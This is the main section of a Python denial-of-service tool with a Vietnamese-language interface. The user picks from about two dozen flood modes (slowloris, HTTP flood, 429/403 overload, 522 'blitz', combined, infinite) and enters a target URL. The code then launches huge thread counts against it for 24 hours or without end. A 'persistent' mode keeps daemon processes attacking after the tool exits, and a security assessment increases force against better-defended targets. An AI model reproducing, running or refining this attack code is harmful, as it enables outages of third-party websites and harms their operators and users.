        analysis_effect(url, status_code=status_code)

        print(f"{Fore.CYAN}{Style.BRIGHT}[BÁO CÁO] Đánh giá bảo mật:{Style.RESET_ALL}")
        print(f"   Thời gian phản hồi trung bình: {avg_response_time:.2f}ms")
        print(f"   Tỷ lệ lỗi (500): {error_rate*100:.1f}%")
        print(f"   Điểm bảo mật: {security_score}/100")
        print(f"   Thông tin DNS: {dns_info}")
        print(f"   Thông tin WHOIS: {whois_info}")
        print(f"   Headers bảo mật: {security_headers}")
        print(f"   Công nghệ: {tech_stack}")
        print(f"   Trạng thái SSL/TLS: {ssl_info}")

        if security_score < 50:
            security_level = "THẤP"
            recommended_threads = 500
            recommended_requests = 200
            print(f"{Fore.GREEN}[KẾT QUẢ] Mục tiêu: Bảo mật thấp - Dễ tấn công{Fore.RESET}")
        elif security_score < 80:
            security_level = "TRUNG BÌNH"
            recommended_threads = 1000
            recommended_requests = 500
            print(f"{Fore.YELLOW}[KẾT QUẢ] Mục tiêu: Bảo mật trung bình - Cần lực lượng vừa phải{Fore.RESET}")
        else:
            security_level = "CAO"
            recommended_threads = 2000
            recommended_requests = 1000
            print(f"{Fore.RED}[KẾT QUẢ] Mục tiêu: Bảo mật cao - Cần lực lượng tối đa{Fore.RESET}")

        return security_level, recommended_threads, recommended_requests

    except Exception as e:
        analysis_effect(url, error=f"Lỗi nghiêm trọng: {str(e)}")
        return "CAO", 2000, 1000

# Main function with enhanced input and effects
def main():
    check_file_integrity()
    multiprocessing.set_start_method('spawn')  # Ensure compatibility with Windows/Linux
    while True:
        try:
            main_display()
            if not validate_key():
                time.sleep(2)
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Tấn công bị hủy - Xác thực thất bại.{Style.RESET_ALL}{Fore.RESET}")
                exit(1)

            print(f"{Fore.BLUE}{Style.BRIGHT}[HỆ THỐNG] Chọn mục tiêu tấn công:{Style.RESET_ALL}{Fore.RESET}")
            while True:
                xoa_man_hinh()
                print(display_quang_bao_ascii())
                print(f"{Fore.YELLOW}Tùy chọn tấn công:")
                print(f"  • large   → Hệ thống lớn (2,000,000 đòn)")
                print(f"  • small   → Hệ thống nhỏ (500,000 đòn)")
                print(f"  • mega    → Thảm họa (5,000 luồng)")
                print(f"  • ultra   → Cấp cao (10,000 luồng)")
                print(f"  • god     → Tối thượng (30,000 luồng)")
                print(f"  • titan   → Titan (5,000,000 luồng)")
                print(f"  • cosmic  → Vũ trụ (60,000,000 luồng)")
                print(f"  • nova    → Nova (100,000,000 luồng)")
                print(f"  • abyss   → Vực thẳm (700,000,000 luồng)")
                print(f"  • void    → Hư không (234,000,000 luồng)")
                print(f"  • omega   → Omega (1,000,000,000 luồng)")
                print(f"  • hyper   → Hyper (10,000,000 luồng)")
                print(f"  • supra   → Supra (20,000,000 luồng)")
                print(f"  • prime   → Prime (50,000,000 luồng)")
                print(f"  • ultima  → Ultima (100,000,000 luồng)")
                print(f"  • pulsar  → Pulsar (30,000,000 luồng)")
                print(f"  • quasar  → Quasar (35,000,000 luồng)")
                print(f"  • giga    → Giga (1,000,000,000,000 luồng)")
                print(f"  • infinite → Vòng lặp vô hạn")
                print(f"  • unlimited → Không giới hạn luồng")
                print(f"  • overload429403 → Quá tải 429/403")
                print(f"  • blitz522 → Siêu tấn công 522")
                print(f"  • combined → Tổng hợp 1-19 dồn dập")
                print(f"  • persistent → Tấn công nền siêu mạnh (MỚI)")
                input_animation()
                xoa_man_hinh()
                print(display_quang_bao_ascii())
                print(f"{Fore.YELLOW}Tùy chọn tấn công:")
                print(f"  • large   → Hệ thống lớn (2,000,000 đòn)")
                print(f"  • small   → Hệ thống nhỏ (500,000 đòn)")
                print(f"  • mega    → Thảm họa (5,000 luồng)")
                print(f"  • ultra   → Cấp cao (10,000 luồng)")
                print(f"  • god     → Tối thượng (30,000 luồng)")
                print(f"  • titan   → Titan (5,000,000 luồng)")
                print(f"  • cosmic  → Vũ trụ (60,000,000 luồng)")
                print(f"  • nova    → Nova (100,000,000 luồng)")
                print(f"  • abyss   → Vực thẳm (700,000,000 luồng)")
                print(f"  • void    → Hư không (234,000,000 luồng)")
                print(f"  • omega   → Omega (1,000,000,000 luồng)")
                print(f"  • hyper   → Hyper (10,000,000 luồng)")
                print(f"  • supra   → Supra (20,000,000 luồng)")
                print(f"  • prime   → Prime (50,000,000 luồng)")
                print(f"  • ultima  → Ultima (100,000,000 luồng)")
                print(f"  • pulsar  → Pulsar (30,000,000 luồng)")
                print(f"  • quasar  → Quasar (35,000,000 luồng)")
                print(f"  • giga    → Giga (1,000,000,000,000 luồng)")
                print(f"  • infinite → Vòng lặp vô hạn")
                print(f"  • unlimited → Không giới hạn luồng")
                print(f"  • overload429403 → Quá tải 429/403")
                print(f"  • blitz522 → Siêu tấn công 522")
                print(f"  • combined → Tổng hợp 1-19 dồn dập")
                print(f"  • persistent → Tấn công nền siêu mạnh (MỚI)")
                target_type = input(f"{Fore.CYAN}Chọn mục tiêu: {Fore.RESET}").lower().strip()
                if target_type in ['large', 'small', 'mega', 'ultra', 'god', 'titan', 'cosmic', 'nova', 'abyss', 'void', 'omega', 'hyper', 'supra', 'prime', 'ultima', 'pulsar', 'quasar', 'giga', 'infinite', 'unlimited', 'overload429403', 'blitz522', 'combined', 'persistent']:
                    target_selection_effect(target_type)
                    break
                print(f"{Fore.RED}[LỖI] Mục tiêu không hợp lệ! Vui lòng nhập lại.{Fore.RESET}")
                time.sleep(1)

            if target_type == "large":
                base_threads = 2000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai 2,000,000 đòn tấn công hệ thống lớn...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "small":
                base_threads = 1000
                base_requests = 500
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai 500,000 đòn tấn công hệ thống nhỏ...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "mega":
                base_threads = 5000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công thảm họa 5,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "ultra":
                base_threads = 10000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công cấp cao 10,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "god":
                base_threads = 30000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công tối thượng 30,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "titan":
                base_threads = 5000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Titan 5,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "cosmic":
                base_threads = 60000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công vũ trụ 60,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "nova":
                base_threads = 100000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Nova 100,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "abyss":
                base_threads = 700000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công vực thẳm 700,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "void":
                base_threads = 234000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công hư không 234,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "omega":
                base_threads = 1000000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Omega 1,000,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "hyper":
                base_threads = 10000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Hyper 10,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "supra":
                base_threads = 20000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Supra 20,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "prime":
                base_threads = 50000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Prime 50,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "ultima":
                base_threads = 100000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Ultima 100,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "pulsar":
                base_threads = 30000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Pulsar 30,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "quasar":
                base_threads = 35000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Quasar 35,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "giga":
                base_threads = 1000000000000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công Giga 1,000,000,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "infinite":
                base_threads = 2000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công vòng lặp vô hạn...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "unlimited":
                base_threads = 10000
                base_requests = 1000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công không giới hạn luồng...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "overload429403":
                base_threads = 15000
                base_requests = 2000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công quá tải 429/403...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "blitz522":
                base_threads = 20000
                base_requests = 3000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai siêu tấn công 522 nguy hiểm...{Style.RESET_ALL}{Fore.RESET}")
            elif target_type == "combined":
                base_threads = 25000
                base_requests = 4000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công tổng hợp 1-19 dồn dập...{Style.RESET_ALL}{Fore.RESET}")
            else:  # persistent
                base_threads = 1000000000000
                base_requests = 10000
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Triển khai tấn công nền siêu mạnh 1,000,000,000,000 luồng...{Style.RESET_ALL}{Fore.RESET}")
                print(f"{Fore.RED}{Style.BRIGHT}[CẢNH BÁO] Tấn công sẽ TIẾP TỤC chạy nền ngay cả khi thoát tool!{Style.RESET_ALL}{Fore.RESET}")
                print(f"{Fore.YELLOW}Để dừng, dùng: killall python3 (Linux/Termux) hoặc Task Manager (Windows){Fore.RESET}")

            print(f"{Fore.BLUE}{Style.BRIGHT}[HỆ THỐNG] Nhập URL mục tiêu:{Style.RESET_ALL}{Fore.RESET}")
            while True:
                try:
                    xoa_man_hinh()
                    print(display_quang_bao_ascii())
                    input_animation()
                    xoa_man_hinh()
                    print(display_quang_bao_ascii())
                    input_url = input(f"{Fore.CYAN}URL: {Fore.WHITE}").strip()
                    if not input_url:
                        print(f"{Fore.RED}[LỖI] URL không được để trống! Vui lòng nhập lại.{Fore.RESET}")
                        time.sleep(1)
                        continue
                    validated_url = validate_url(input_url)
                    print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Mục tiêu đã khóa: {validated_url}{Style.RESET_ALL}{Fore.RESET}")
                    if target_type not in ("infinite", "unlimited", "overload429403", "blitz522", "combined", "persistent"):
                        confirm = input(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Xác nhận tấn công (y/n): {Style.RESET_ALL}{Fore.RESET}").lower().strip()
                        if confirm == 'y':
                            confirm_effect()
                            break
                        else:
                            print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Tấn công bị hủy{Fore.RESET}")
                    else:
                        confirm_effect()
                        break
                except ValueError as e:
                    print(f"{Fore.RED}[LỖI] {str(e)}{Fore.RESET}")
                    time.sleep(1)

            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "THẤP":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            print(f"{Fore.CYAN}{Style.BRIGHT}[HỆ THỐNG] Chiến lược tấn công:{Style.RESET_ALL}")
            print(f"   Số luồng: {NUM_THREADS:,}")
            print(f"   Số yêu cầu mỗi luồng: {REQUESTS_PER_THREAD:,}")
            print(f"   Chiến lược: {attack_strategy}{Fore.RESET}")

            print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Khởi động tấn công 24h...{Style.RESET_ALL}{Fore.RESET}")
            print(f"Mục tiêu: {validated_url}")
            print(f"Lực lượng: {NUM_THREADS * REQUESTS_PER_THREAD:,} đòn đánh mỗi chu kỳ{Fore.RESET}")

            start_time = time.time()

            if target_type == "persistent":
                save_attack_config(validated_url, NUM_THREADS, REQUESTS_PER_THREAD)
                processes = []
                for _ in range(min(NUM_THREADS, multiprocessing.cpu_count() * 2)):  # Limit to CPU cores * 2
                    p = multiprocessing.Process(target=persistent_attack_process, args=(validated_url, REQUESTS_PER_THREAD))
                    p.daemon = True  # Daemon ensures process runs in background
                    processes.append(p)
                    p.start()
                print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Tấn công nền đã khởi động với {len(processes)} tiến trình!{Style.RESET_ALL}{Fore.RESET}")
                print(f"{Fore.YELLOW}Tool có thể thoát, tấn công vẫn tiếp tục trong nền.{Fore.RESET}")
                print(f"{Fore.YELLOW}Để dừng, dùng: killall python3 (Linux/Termux) hoặc Task Manager (Windows){Fore.RESET}")
                time.sleep(2)
                exit(0)  # Exit main program, attacks continue in background
            elif target_type == "unlimited":
                unlimited_thread = threading.Thread(target=unlimited_threads_attack, args=(validated_url,))
                unlimited_thread.start()
                try:
                    unlimited_thread.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công không giới hạn bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target_type == "overload429403":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=overload_429_403_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công quá tải 429/403 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target_type == "blitz522":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=blitz_522_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Siêu tấn công 522 bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            elif target_type == "combined":
                threads = []
                for _ in range(NUM_THREADS):
                    t = threading.Thread(target=combined_all_attack, args=(validated_url, REQUESTS_PER_THREAD))
                    threads.append(t)
                    t.start()
                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công tổng hợp bị dừng bởi người dùng{Fore.RESET}")
                    exit(0)
            else:
                while True if target_type == "infinite" else time.time() - start_time < 24 * 3600:
                    slowloris_thread = threading.Thread(target=slowloris_attack, args=(validated_url, 30))
                    flood_thread = threading.Thread(target=http_flood_attack, args=(validated_url, NUM_THREADS * 2))
                    slowloris_thread.start()
                    flood_thread.start()

                    threads = []
                    for _ in range(NUM_THREADS):
                        t = threading.Thread(target=send_request, args=(validated_url, REQUESTS_PER_THREAD))
                        threads.append(t)
                        t.start()

                    for t in threads:
                        t.join()

                    slowloris_thread.join()
                    flood_thread.join()

                    if target_type != "infinite":
                        remaining_time = 24 * 3600 - (time.time() - start_time)
                        print(f"{Fore.YELLOW}[HỆ THỐNG] Thời gian còn lại: {remaining_time // 3600:.0f}h {(remaining_time % 3600) // 60:.0f}m {remaining_time % 60:.0f}s{Fore.RESET}")
                    else:
                        print(f"{Fore.YELLOW}[HỆ THỐNG] Chu kỳ tấn công vô hạn: Tiếp tục...{Fore.RESET}")
                    time.sleep(1)

            end_time = time.time()
            total_time = end_time - start_time

            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0

            print(f"{Fore.CYAN}{Style.BRIGHT}[BÁO CÁO] Tấn công hoàn tất{Style.RESET_ALL}")
            print(f"   Tổng số đòn đánh: {(NUM_THREADS * REQUESTS_PER_THREAD) * (total_time // (24 * 3600) + 1):,}")
            print(f"   Thành công: {success_count:,} [{success_count/((NUM_THREADS * REQUESTS_PER_THREAD) * (total_time // (24 * 3600) + 1))*100:.1f}%]")
            print(f"   Thất bại: {error_count:,} [{error_count/((NUM_THREADS * REQUESTS_PER_THREAD) * (total_time // (24 * 3600) + 1))*100:.1f}%]")
            print(f"   Tổng thời gian: {total_time:.2f} giây")
            print(f"   Thời gian phản hồi trung bình: {avg_response_time:.2f}ms")
            print(f"   Hiệu suất đỉnh: {max_response_time:.2f}ms")
            print(f"   Độ trễ tối thiểu: {min_response_time:.2f}ms")
            print(f"   Đòn đánh mỗi giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f}")
            print(f"{Fore.RED}{Style.BRIGHT}[HỆ THỐNG] Mục tiêu đã bị vô hiệu hóa!{Style.RESET_ALL}{Fore.RESET}")

            if target_type == "infinite":
                print(f"{Fore.YELLOW}[HỆ THỐNG] Tấn công vô hạn tiếp tục...{Fore.RESET}")
                continue

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Tấn công bị dừng bởi người dùng{Style.RESET_ALL}{Fore.RESET}")
            exit(0)
        except Exception as e:
            print(f"{Fore.RED}[LỖI] Sự cố: {str(e)}{Fore.RESET}")
            exit(1)

        if target_type != "infinite":
            continue_choice = input(f"{Fore.CYAN}{Style.BRIGHT}[HỆ THỐNG] Tiếp tục tấn công thêm 24h? (y/n): {Style.RESET_ALL}{Fore.RESET}")
            if continue_choice.lower() != 'y':
                print(f"{Fore.YELLOW}{Style.BRIGHT}[HỆ THỐNG] Chiến dịch kết thúc{Style.RESET_ALL}{Fore.RESET}")
                break

if __name__ == "__main__":
    main()
```